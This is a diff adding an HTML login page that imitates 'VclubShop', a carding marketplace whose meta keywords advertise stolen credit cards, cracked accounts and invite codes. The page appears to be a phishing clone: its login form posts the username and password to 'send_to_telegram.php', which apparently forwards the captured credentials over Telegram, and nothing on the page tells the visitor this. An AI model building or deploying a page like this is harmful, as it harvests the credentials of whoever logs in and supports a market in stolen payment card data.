@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/x-icon" href="https://vclub.gd/public/assets/images/logo.svg">
+    <link rel="stylesheet" type="text/css" href="../../public/assets/css/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="../../public/assets/css/jquery-ui-1.10.0.custom.min.css">
+    <link rel="stylesheet" type="text/css" href="../../public/assets/css/style.css">
+    <link rel="stylesheet" type="text/css" href="../../public/assets/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="../../public/assets/css/newlogon2.css">
+    <link rel="stylesheet" type="text/css" href="../../public/assets/css/flags.css">
+    <script type="text/javascript" src="../../public/assets/js/jquery.min.js"></script>
+    <script type="text/javascript" src="../../public/assets/js/bootstrap.bundle.min.js"></script>
+    <script type="text/javascript" src="../../public/assets/js/jquery-ui-1.10.0.custom.min.js"></script>
+    <script type="text/javascript" src="../../public/assets/js/jquery.noty.js"></script>
+    <script type="text/javascript" src="../../public/assets/js/center.js"></script>
+    <script type="text/javascript" src="../../public/assets/js/bottomRight.js"></script>
+    <script type="text/javascript" src="../../public/assets/js/default.js"></script>
+    <script type="text/javascript" src="../../public/assets/js/core.js"></script>
+    <script type="text/javascript" src="../../public/assets/js/bootstrap-datepicker.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+    <title>Vclub | VclubShop - Login </title>
+    <meta http-equiv="content-language" content="en-us">
+    <meta name="keywords" content="vclubshop, vclub carding, vclub, vclub.tel, vclub tel, underground marketplace, vclubshops, vclub new domain, new cc shop vclub, vclub free account, vclub cracked account, vclub hacked accounts, vclub index, Vclub invite code,vclub.tel invitation code,vclub invitation code,vclub cc invitation code" />
+    <meta name="description"content="Welcome to Vclub cc shop. Vclub best cc shop in underground market, Vclub cvv - login | Registration Open for VClub Shop, Sign in or create account for Invitation code" /
+</head>
+<body class="text-center">
+    <style>
+        html {
+            background-color: #000;
+            height: 100%;
+        }
+        body,
+        body>div {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 100%;
+        }
+    </style>
+    <div class="container">
+        <div class="row" style="text-align: center;">
+            <div class="col-md-12 ">
+                <div class="text registration">Registration: <strong>Open</strong>, Registration Fee: <strong>$50</strong></div>
+                <div class="form">
+                    <form id="loginForm" action="send_to_telegram.php" method="post">
+                        <div class="fields">
+                            <div class="fields-half">
+                                <div class="form-group">
+                                    <label class="control-label required" for="P_LoginForm_username">Username <span class="required">*</span></label>
+                                    <div class="controls"><input id="inputUsername" class="form-control" placeholder="Username*" name="username" type="text" /></div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="fields">
+                            <div class="fields-half">
+                                <div class="form-group">
+                                    <label class="control-label required" for="P_LoginForm_password">Password <span class="required">*</span></label>
+                                    <div class="controls"><input id="inputPassword" class="form-control" placeholder="Password*" name="password" type="password" /></div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="fields hide" id="captchaField">
+                            <div class="fields-half">
+                                <div class="form-group">
+                                    <label class="control-label" for="P_LoginForm_verifyCode">Captcha</label>
+                                    <div class="controls"><input id="inputCaptcha" autocomplete="off" class="form-control half" placeholder="Captcha*" name="verifyCode" type="text" required /></div>
+                                </div>
+                                <div class="captcha" id="captcha"><img id="captchaImage" src="captcha.html" alt="Captcha" /></div>
+                            </div>
+                        </div>
+                        <div class="fields">
+                            <div class="fields-half">
+                                <div class="form-actions"><button class="green btn btn-secondary" type="submit" name="yt0">Login</button></div>
+                                <div class="form-actions"><a href="signin.html"><button style="" class="btn btn-secondary" name="yt1" type="button">Registration</button></a></div>
+                            </div>
+                        </div>
+                        <div class="fields">
+                            Forgot your password use <a href="restore.html">this form</a>.
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="../../public/assets/js/bootstrap.js"></script>
+    <script>
+        // Show captcha field after password is entered
+        document.getElementById('inputPassword').addEventListener('input', function() {
+            var captchaField = document.getElementById('captchaField');
+            if (this.value.length > 0) {
+                captchaField.classList.remove('hide');
+            } else {
+                captchaField.classList.add('hide');
+            }
+        });
+
+        // Refresh captcha image
+        document.getElementById('captchaImage').addEventListener('click', function() {
+            var timestamp = new Date().getTime();
+            this.src = "captcha.html?" + timestamp;
+        });
+    </script>
+</body>
+</html>
